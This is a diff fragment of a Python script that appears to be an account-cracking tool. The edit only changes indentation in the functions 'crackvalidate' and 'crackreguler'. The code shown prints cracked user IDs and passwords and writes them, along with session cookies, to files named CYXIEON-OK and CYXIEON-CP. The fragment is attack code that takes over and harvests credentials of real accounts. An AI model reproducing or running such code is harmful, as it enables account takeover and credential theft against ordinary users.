@@ -862,15 +862,15 @@ def crackvalidate(idf,pwx,url):
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 			    print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
-				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
-				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
-				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f'{biru}└──[{puti}{ung}{ua}')
-				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
-				akune.append(idf+'|'+pw)
-				ceker(idf,pw)
-				cp+=1
-				break	
+			    print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
+			    print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+			    print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+			    print(f'{biru}└──[{puti}{ung}{ua}')
+			    open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+			    akune.append(idf+'|'+pw)
+			    ceker(idf,pw)
+			    cp+=1
+			    break	
 				
 			else:
 				continue
@@ -947,7 +947,7 @@ def crackreguler(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-			    print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
+				print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
 				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
 				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
 				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
